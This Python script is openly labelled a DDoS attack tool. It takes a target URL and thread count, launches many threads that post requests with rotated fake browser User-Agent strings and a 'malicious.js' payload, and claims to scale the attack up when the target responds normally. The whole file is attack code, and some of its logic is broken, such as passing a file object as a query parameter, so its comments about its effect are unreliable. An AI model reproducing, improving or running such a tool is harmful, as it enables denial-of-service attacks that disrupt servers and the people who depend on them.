import requests
import threading
import random
from datetime import datetime
from contextlib import suppress
from werkzeug.utils import secure_filename
    
def start_DDoS(url):
    try:    
        # Send a large number of malicious requests to the server with random headers.
        with suppress(Exception):
            # Check the server's response to the attack.
            response = requests.get(url)
            if response.status_code == 200:
                # If the response is successful, increase the attack parameters.
                print('[+] Response 200: Increasing attack parameters')
                threads = 10000
                num_packets = 10000000000
            else:
                # If the response is unsuccessful, decrease the attack parameters.
                print('[+] Response not 200: Decreasing attack parameters')
                threads = 50
                num_packets = 10000000
            # Read malicious file
            malicious_file = open("malicious.js", 'rb')    
            # Send the malicious requests to the server.
            for x in range(threads):
                headers_list = [
                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
                        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15'
                ]

                payloads = { 'num_packets':num_packets,
                            'malicious_file': malicious_file
                            }

                headers = {'User-Agent': random.choice(headers_list)}
                requests.post(url, headers=headers, params=payloads)
    except requests.exceptions.ConnectionError:
        pass

def main():
    url = input('Please provide the URL to launch the attack: ')
    value = int(input('Please provide the amount of threads you would like to use: '))
    print('[+] Attack Started at {}'.format(str(datetime.now())))

    for i in range(value):
        print("Starting thread #{}...".format(str(i + 1)))
        thread = threading.Thread(target=start_DDoS, args=(url,))
        thread.start()

if __name__ == '__main__':
    main()
